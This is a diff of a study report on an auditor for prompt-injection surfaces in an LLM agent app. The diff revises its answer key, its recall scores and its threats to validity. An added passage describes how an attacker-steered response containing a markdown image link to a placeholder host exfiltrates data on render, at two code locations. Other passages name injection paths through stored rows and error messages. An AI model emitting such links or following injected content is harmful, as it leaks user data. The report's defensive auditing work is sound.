@@ -50,13 +50,22 @@ Three entries were added that sit at **no extracted surface at all** — the raw
 database exception returned to the agent, stored rows re-entering as
 observations, and the discarded trace. That matters structurally: every entry in
 the first draft landed exactly on a surface the extractor emits, so recall was
-being measured over a denominator drawn from the tool's own inventory. It no
-longer is, and the score fell from 4 of 6 to 3 of 8 as a result.
+measured over a denominator drawn from the tool's own inventory. **Three of
+eight now sit off it**, which is a ratio rather than a cure — the other five
+still constrain the join with a `surface_name` that is a literal row in
+`detector_names.py`. The score fell from 4 of 6 to 3 of 8 as a result.
 
 **A defect the reviewer proposed and I did not add**: model output reaching an
-HTML renderer. `unsafe_allow_html=True` appears once, at `main.py:36`, on a
-static style block — never on model output. `st.write(response["output"])`
-escapes HTML. The entry would have been false.
+HTML renderer. `unsafe_allow_html=True` appears four times — `main.py:36`,
+`utils.py:19`, `:41`, `:71` — and none carries model output, so the HTML sink is
+not there and `st.write(response["output"])` escapes HTML.
+
+That is not the whole sink, and saying so is the point of recording the
+refusal. `st.write` renders **markdown**, so an attacker-steered response
+containing `![](https://host/?d=…)` exfiltrates on render, at `main.py:83` and
+again at `:56-57` where the raw agent trace is written. A future entry belongs
+there; it is absent because nobody has verified it, not because it was ruled
+out.
 
 ### A measurement that had to be redone
 
@@ -154,8 +163,9 @@ interpolation point is refuted **statically, without a model call**, because
 this check's claim is that a runtime value sits undelimited in instruction text
 and such a template has no runtime value in it. The false positive is now
 unreachable rather than unlikely. The auditor's published score fell from 5 of 6
-to 4 of 6 as a result — **the study's main effect was to lower this project's own
-headline**, which is the outcome a comparison is for.
+to 4 of 6 as a result, and to 3 of 8 once the key was widened (see Detection) —
+**the study's main effect was to lower this project's own headline**, which is
+the outcome a comparison is for.
 
 **Answering the objective, on this evidence.** One application, one template,
 one hosted model. On the single case where the two could be compared, the
@@ -275,7 +285,7 @@ dynamic in recall, which would need the comparison this study did not run.
 
 ## Threats to validity
 
-- One application, six entries, an unverified key drafted by the same system
+- One application, eight entries, an unverified key drafted by the same system
   that built the tool.
 - Both compared systems were authored with the app visible.
 - The probe's verdict is model-dependent; another Ollama build may not reproduce
